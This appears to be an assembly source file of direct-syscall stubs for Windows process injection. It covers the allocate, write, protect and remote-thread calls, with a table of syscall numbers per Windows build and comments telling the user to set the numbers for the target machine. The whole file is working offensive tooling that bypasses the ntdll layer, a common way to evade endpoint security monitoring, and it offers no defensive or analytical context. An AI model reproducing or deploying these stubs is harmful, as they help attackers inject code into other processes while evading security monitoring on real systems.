; syscall-stubs.asm
; Direct syscall MASM stubs for common injection primitives.
; Assemble with: ml64 /c /Fo syscall-stubs.obj syscall-stubs.asm
; Or add to a Visual Studio x64 project with MASM build customisation enabled.
;
; SSN constants are defined at the top — update for the target Windows build.
; Reference table (verify against ntdll on the actual target):
;
;   Function                  Win10 21H2   Win11 22H2   Win11 23H2
;   NtAllocateVirtualMemory   0018h        0018h        0018h
;   NtWriteVirtualMemory      003Ah        003Ah        003Ah
;   NtProtectVirtualMemory    0050h        0050h        0050h
;   NtCreateThreadEx          00C1h        00C7h        00C8h
;
; Calling convention: first arg moves rcx -> r10 (required for all NT stubs).
; Prototype declarations for the C/C++ side are in syscall-stubs.h

; ── SSN constants — set for target build ─────────────────────────────────────
SSN_NtAllocateVirtualMemory EQU 0018h
SSN_NtWriteVirtualMemory    EQU 003Ah
SSN_NtProtectVirtualMemory  EQU 0050h
SSN_NtCreateThreadEx        EQU 00C1h   ; Win10 21H2 — change for other builds

.code

; ── NtAllocateVirtualMemory ───────────────────────────────────────────────────
; NTSTATUS NtAllocateVirtualMemory(
;   HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
;   PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, SSN_NtAllocateVirtualMemory
    syscall
    ret
NtAllocateVirtualMemory ENDP

; ── NtWriteVirtualMemory ──────────────────────────────────────────────────────
; NTSTATUS NtWriteVirtualMemory(
;   HANDLE ProcessHandle, PVOID BaseAddress,
;   PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, SSN_NtWriteVirtualMemory
    syscall
    ret
NtWriteVirtualMemory ENDP

; ── NtProtectVirtualMemory ────────────────────────────────────────────────────
; NTSTATUS NtProtectVirtualMemory(
;   HANDLE ProcessHandle, PVOID* BaseAddress,
;   PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, SSN_NtProtectVirtualMemory
    syscall
    ret
NtProtectVirtualMemory ENDP

; ── NtCreateThreadEx ──────────────────────────────────────────────────────────
; NTSTATUS NtCreateThreadEx(
;   PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
;   HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
;   ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
;   SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, SSN_NtCreateThreadEx
    syscall
    ret
NtCreateThreadEx ENDP

End
